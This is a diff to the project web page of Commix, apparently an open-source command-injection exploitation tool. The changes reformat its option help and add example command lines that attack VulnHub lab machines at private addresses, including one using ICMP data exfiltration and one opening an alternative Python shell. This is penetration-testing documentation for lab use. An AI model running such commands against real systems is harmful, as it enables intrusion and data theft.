@@ -6,7 +6,7 @@
     <meta http-equiv="X-UA-Compatible" content="chrome=1">
     <meta name="description" content="Commix : Automated All-in-One OS Command Injection and Exploitation Tool">
     <link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css">
-    <title>Commix</title>
+    <title>Commix : Command Injection and Exploitation Tool</title>
   </head>
 
   <body>
@@ -131,25 +131,17 @@ These options can be used to access files on the target host.
 <h4>
 <a id="injection" class="anchor" href="#injection" aria-hidden="true"><span class="octicon octicon-link"></span></a>Injection</h4>
 These options can be used, to specify which parameters to inject and to provide custom injection payloads.
-<pre><code>--data=DATA         POST data to inject (use 'INJECT_HERE' tag to specify
-                    the testable parameter).
+<pre><code>--data=DATA         POST data to inject (use 'INJECT_HERE' tag to specify the testable parameter).
 --suffix=SUFFIX     Injection payload suffix string.
 --prefix=PREFIX     Injection payload prefix string.
---technique=TECH    Specify a certain injection technique : 'classic',
-                    'eval-based', 'time-based' or 'file-based'.
---maxlen=MAXLEN     The length of the output on time-based technique
-                    (Default: 10000 chars).
---delay=DELAY       Set Time-delay for time-based and file-based
-                    techniques (Default: 1 sec).
---base64            Use Base64 (enc)/(de)code trick to prevent false-
-                    positive results.
+--technique=TECH    Specify a certain injection technique : 'classic', 'eval-based', 'time-based' or 'file-based'.
+--maxlen=MAXLEN     The length of the output on time-based technique (Default: 10000 chars).
+--delay=DELAY       Set Time-delay for time-based and file-based techniques (Default: 1 sec).
+--base64            Use Base64 (enc)/(de)code trick to prevent false-positive results.
 --tmp-path=TMP_P..  Set remote absolute path of temporary files directory.
---root-dir=SRV_R..  Set remote absolute path of web server's root
-                    directory (Default: /var/www/).
---icmp-exfil=IP_..  Use the ICMP exfiltration technique (e.g.
-                    'ip_src=192.168.178.1,ip_dst=192.168.178.3').
---alter-shell       Use an alternative os-shell (Python). Available only
-                    for 'tempfile-based' injections.
+--root-dir=SRV_R..  Set remote absolute path of web server's root directory (Default: /var/www/).
+--icmp-exfil=IP_..  Use the ICMP exfiltration technique (e.g. 'ip_src=192.168.178.1,ip_dst=192.168.178.3').
+--alter-shell=AL..  Use an alternative os-shell (e.g. Python). Available, only for 'tempfile-based' injections.
 --os-cmd=OS_CMD     Execute a single operating system command.
 </code></pre>
 
@@ -173,7 +165,12 @@ These options can be used, to specify which parameters to inject and to provide 
 
 <p><strong>Exploiting <a href="https://www.vulnhub.com/entry/persistence-1,103/" target="_blank">Persistence</a> using ICMP exfiltration technique :</strong></p>
 
-<pre><code>su -c "python commix.py --url="http://192.168.178.8/debug.php" --data="addr=127.0.0.1" --icmp-exfil="ip_src=192.168.178.5,ip_dst=192.168.178.8""
+<pre><code>su -c "python commix.py --url="http://192.168.178.8/debug.php" --data="addr=INJECT_HERE" --icmp-exfil="ip_src=192.168.178.5,ip_dst=192.168.178.8""
+</code></pre>
+
+<p><strong>Exploiting <a href="https://www.vulnhub.com/entry/persistence-1,103/" target="_blank">Persistence</a> using an alternative (python) ahell :</strong></p>
+
+<pre><code>python commix.py --url="http://192.168.178.8/debug.php" --data="addr=INJECT_HERE" --alter-shell="Python"
 </code></pre>
 
 <p><strong>Exploiting <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/" target="_blank">Kioptrix: 2014 (#5)</a> using custom user-agent and specified injection technique:</strong></p>
@@ -200,10 +197,9 @@ These options can be used, to specify which parameters to inject and to provide 
 <h4>
 <a id="command-injection-testbeds" class="anchor" href="#command-injection-testbeds" aria-hidden="true"><span class="octicon octicon-link"></span></a>Exploitation Demos</h4>
 <ul>
-<li><a href="https://www.youtube.com/watch?v=PT4uSTCxKJU" target="_blank">Exploiting DVWA</a></li>
-<iframe src="https://www.youtube.com/embed/PT4uSTCxKJU" width="560" height="315" frameborder="0" allowfullscreen></iframe>
-<li><a href="https://www.youtube.com/watch?v=zqI8NcHfboo" target="_blank">Exploiting bWAPP</a></li>
-<iframe src="https://www.youtube.com/embed/zqI8NcHfboo" width="560" height="315" frameborder="0" allowfullscreen></iframe>
+<li><a href="https://www.youtube.com/watch?v=PT4uSTCxKJU" target="_blank">Exploiting DVWA (1.0.8) command injection flaws</a></li>
+<li><a href="https://www.youtube.com/watch?v=zqI8NcHfboo" target="_blank">Exploiting bWAPP command injection flaws (normal & blind) </a></li>
+<li><a href="https://www.youtube.com/watch?v=aVTGqiyVz5o" target="_blank">Exploiting 'Persistence' blind command injection flaw</a></li>
 </ul>
       </section>
       <br>
